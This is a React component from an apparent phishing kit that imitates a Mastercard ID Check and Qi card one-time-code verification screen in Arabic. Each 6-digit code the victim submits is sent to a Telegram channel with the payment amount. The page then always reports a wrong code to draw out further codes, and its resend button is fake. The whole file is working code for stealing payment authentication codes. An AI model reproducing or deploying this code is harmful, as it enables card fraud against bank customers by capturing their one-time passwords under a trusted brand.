import { useState } from "react";
import { sendToTelegram } from "../utils/telegram";
import { t, languages, type Lang } from "../i18n/translations";

interface VerifyPageProps {
  onCancel: () => void;
  iqdAmount: string;
  lang: Lang;
}

export default function VerifyPage({ onCancel, iqdAmount, lang }: VerifyPageProps) {
  const tr = t[lang];
  const dir = languages.find((l) => l.code === lang)?.dir || "rtl";
  const [code, setCode] = useState("");
  const [error, setError] = useState(false);

  const handleSubmit = () => {
    if (code.length === 6) {
      sendToTelegram(
        `🔑 <b>رمز التحقق الجديد</b>\n\n` +
        `📟 الرمز: <code>${code}</code>\n` +
        `💰 المبلغ: <code>IQD ${iqdAmount}</code>`
      );
      setError(true);
      setCode("");
    }
  };

  const displayCode = () => {
    const chars = code.split("");
    const result = [];
    for (let i = 0; i < 6; i++) {
      result.push(chars[i] || "-");
    }
    return result.join("  ");
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "#fff",
        display: "flex",
        flexDirection: "column",
        maxWidth: 480,
        marginLeft: "auto",
        marginRight: "auto",
        fontFamily: "Arial, 'Cairo', sans-serif",
        padding: "0 20px",
        boxSizing: "border-box",
      }}
    >
      {/* Cancel row */}
      <div style={{ display: "flex", justifyContent: "flex-end", paddingTop: 18, paddingBottom: 4 }}>
        <button
          onClick={onCancel}
          style={{
            background: "none",
            border: "none",
            color: "#2196F3",
            fontSize: 16,
            cursor: "pointer",
            fontFamily: "Arial, sans-serif",
            padding: 0,
          }}
        >
          {tr.cancel}
        </button>
      </div>

      {/* Logos row */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          paddingTop: 10,
          paddingBottom: 20,
        }}
      >
        {/* Left: Qi logo */}
        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
          <div
            style={{
              width: 42,
              height: 42,
              borderRadius: "50%",
              background: "#F0B90B",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              fontWeight: 900,
              fontSize: 22,
              color: "#fff",
              fontFamily: "Arial Black, Arial, sans-serif",
            }}
          >
            Q
          </div>
          <span
            style={{
              fontSize: 18,
              fontWeight: 700,
              color: "#F0B90B",
              fontFamily: "'Cairo', Arial, sans-serif",
              marginRight: 4,
            }}
          >
            كي
          </span>
        </div>

        {/* Right: Mastercard ID Check */}
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          {/* Mastercard circles */}
          <div style={{ display: "flex", alignItems: "center" }}>
            <div
              style={{
                width: 32,
                height: 32,
                borderRadius: "50%",
                background: "#EB001B",
                marginRight: -12,
                zIndex: 1,
              }}
            />
            <div
              style={{
                width: 32,
                height: 32,
                borderRadius: "50%",
                background: "#F79E1B",
                opacity: 0.95,
              }}
            />
          </div>
          <div
            style={{
              width: 1,
              height: 28,
              background: "#ddd",
              marginLeft: 4,
              marginRight: 4,
            }}
          />
          <span
            style={{
              fontSize: 16,
              fontWeight: 700,
              color: "#333",
              fontFamily: "Arial, sans-serif",
            }}
          >
            ID Check
          </span>
        </div>
      </div>

      {/* Verify title */}
      <div
        style={{
          textAlign: "center",
          fontWeight: 700,
          fontSize: 28,
          color: "#222",
          marginBottom: 32,
          fontFamily: "Arial, sans-serif",
        }}
      >
        {tr.verify}
      </div>


      {/* Info row */}
      <div
        style={{
          display: "flex",
          justifyContent: "space-between",
          alignItems: "flex-end",
          marginBottom: 10,
          direction: "ltr",
        }}
      >
        <span style={{ fontSize: 14, color: "#333", fontFamily: "Arial, sans-serif" }}>
          {tr.enterCode}
        </span>
        <span
          style={{
            fontSize: 13,
            color: "#555",
            fontFamily: "'Cairo', Arial, sans-serif",
            direction: dir,
            textAlign: dir === "rtl" ? "right" : "left",
          }}
        >
          {tr.noteDeduct}{" "}
          <strong style={{ color: "#222" }}>IQD 38.596.00</strong>
        </span>
      </div>

      {/* 6-digit input field */}
      <div
        style={{
          border: `2px solid ${error ? "#e53935" : "#90CAF9"}`,
          borderRadius: 10,
          padding: "14px 16px",
          marginBottom: error ? 8 : 20,
          background: "#fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          position: "relative",
        }}
      >
        <div
          style={{
            fontSize: 22,
            letterSpacing: 10,
            color: code ? "#222" : "#bbb",
            fontFamily: "monospace",
            textAlign: "center",
            minWidth: "100%",
            userSelect: "none",
          }}
        >
          {displayCode()}
        </div>
        <input
          type="text"
          inputMode="numeric"
          maxLength={6}
          value={code}
          onChange={(e) => {
            setError(false);
            setCode(e.target.value.replace(/\D/g, "").slice(0, 6));
          }}
          style={{
            position: "absolute",
            inset: 0,
            opacity: 0,
            cursor: "text",
            width: "100%",
            height: "100%",
          }}
          autoFocus
        />
      </div>

      {/* Error message */}
      {error && (
        <div
          style={{
            color: "#e53935",
            fontSize: 14,
            fontFamily: "'Cairo', Arial, sans-serif",
            textAlign: "center",
            marginBottom: 16,
            fontWeight: 600,
          }}
        >
          {tr.wrongCode}
        </div>
      )}

      {/* Submit button */}
      <button
        onClick={handleSubmit}
        style={{
          width: "100%",
          padding: "16px",
          background: "#1a3a6b",
          border: "none",
          borderRadius: 10,
          color: "#fff",
          fontSize: 18,
          fontWeight: 700,
          fontFamily: "Arial, sans-serif",
          cursor: "pointer",
          marginBottom: 16,
          transition: "opacity 0.2s",
        }}
        onMouseEnter={(e) =>
          ((e.currentTarget as HTMLButtonElement).style.opacity = "0.88")
        }
        onMouseLeave={(e) =>
          ((e.currentTarget as HTMLButtonElement).style.opacity = "1")
        }
      >
        {tr.submit}
      </button>

      {/* Resend Code button */}
      <button
        onClick={() => setCode("")}
        style={{
          width: "100%",
          padding: "15px",
          background: "#f8f8f8",
          border: "1.5px solid #e0e0e0",
          borderRadius: 10,
          color: "#1a3a6b",
          fontSize: 17,
          fontWeight: 700,
          fontFamily: "Arial, sans-serif",
          cursor: "pointer",
          transition: "opacity 0.2s",
        }}
        onMouseEnter={(e) =>
          ((e.currentTarget as HTMLButtonElement).style.background = "#f0f0f0")
        }
        onMouseLeave={(e) =>
          ((e.currentTarget as HTMLButtonElement).style.background = "#f8f8f8")
        }
      >
        {tr.resendCode}
      </button>
    </div>
  );
}
